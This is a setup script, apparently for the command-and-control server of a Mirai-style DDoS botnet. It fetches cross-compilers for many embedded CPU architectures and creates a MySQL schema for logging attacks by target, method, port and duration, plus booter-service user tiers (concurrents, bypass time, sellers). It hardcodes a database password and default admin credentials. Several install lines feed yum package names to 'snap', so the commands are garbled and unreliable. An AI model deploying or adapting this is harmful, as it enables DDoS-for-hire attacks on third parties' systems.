# Install Depencies:
snap update -y
snap install wget -y
snap install golang -y
snap install dos2unix -y
snap install screen -y
snap install ntp -y
snap install epel-release -y
snap groupinstall "Development Tools" -y
snap install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
snap install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
rm -rf /usr/local/go
wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz
sha256sum go1.10.3.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
source ~/.bash_profile
rm -rf go1.10.3.linux-amd64.tar.gz
mkdir /etc/xcompile
cd /etc/xcompile
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
rm -rf *.tar.bz2
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
rm -rf /usr/local/go
cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz -q --no-check-certificate -c
tar -xzf go1.13.linux-amd64.tar.gz
mv go /usr/local
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
go version
go env
cd ~/

# Install Mysql:

wget https://dev.mysql.com/get/mysql57-community-release-el7-9.noarch.rpm
sudo rpm -ivh mysql57-community-release-el7-9.noarch.rpm

snap install mysql-server

sudo systemctl start mysqld

sudo grep 'temporary password' /var/log/mysqld.log

sudo mysql_secure_installation

# Create Database:

mysql -u root -p vmfeLikesBread!123.yukariv1@
CREATE DATABASE yukariv2;
USE yukariv2;

CREATE TABLE `logins` (
  `id` int(11) NOT NULL,
  `username` varchar(32) NOT NULL,
  `action` varchar(32) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

CREATE TABLE `messages` (
  `id` int(11) NOT NULL,
  `to` int(11) NOT NULL,
  `from` int(11) NOT NULL,
  `subject` varchar(40) NOT NULL,
  `content` varchar(500) NOT NULL,
  `seen` tinyint(4) NOT NULL DEFAULT '0',
  `created` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

CREATE TABLE `attacksv2` (
     `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
     `username` varchar(20) NOT NULL,
     `target` varchar(255) NOT NULL,
     `method` varchar(20) NOT NULL,
     `port` int(11) NOT NULL,
     `duration` int(11) NOT NULL,
     `end` bigint(20) NOT NULL,
     `created` bigint(20) NOT NULL,
     PRIMARY KEY (`id`),
     KEY `username` (`username`)
);

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `admin` int(10) UNSIGNED DEFAULT '0',
  `expiry` bigint(20) NOT NULL,
  `ban` bigint(20) NOT NULL,
  `vip` int(10) UNSIGNED DEFAULT '0',
  `mfasecret` varchar(200) NOT NULL,
  `concurrents` int(10) UNSIGNED DEFAULT '0',
  `cooldown` int(10) UNSIGNED DEFAULT '0',
  `hometime` int(10) UNSIGNED DEFAULT '300',
  `bypasstime` int(10) UNSIGNED DEFAULT '120',
  `premium` int(10) UNSIGNED DEFAULT '0',
  `home` int(10) UNSIGNED DEFAULT '0',
  `seller` int(10) UNSIGNED DEFAULT '0',
  `flagged` int(10) UNSIGNED DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

INSERT INTO `users` (`id`, `username`, `password`, `admin`, `expiry`, `ban`, `vip`, `mfasecret`, `concurrents`, `cooldown`, `hometime`, `bypasstime`, `premium`, `home`, `seller`, `flagged`) VALUES ('1', 'vmfe', 'changeme', '1', '2490160340', '0', '1', '', '1', '40', '300', '120', '1', '1', '1', '0');

ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD KEY `username` (`username`);

ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

COMMIT;
EXIT;






go build .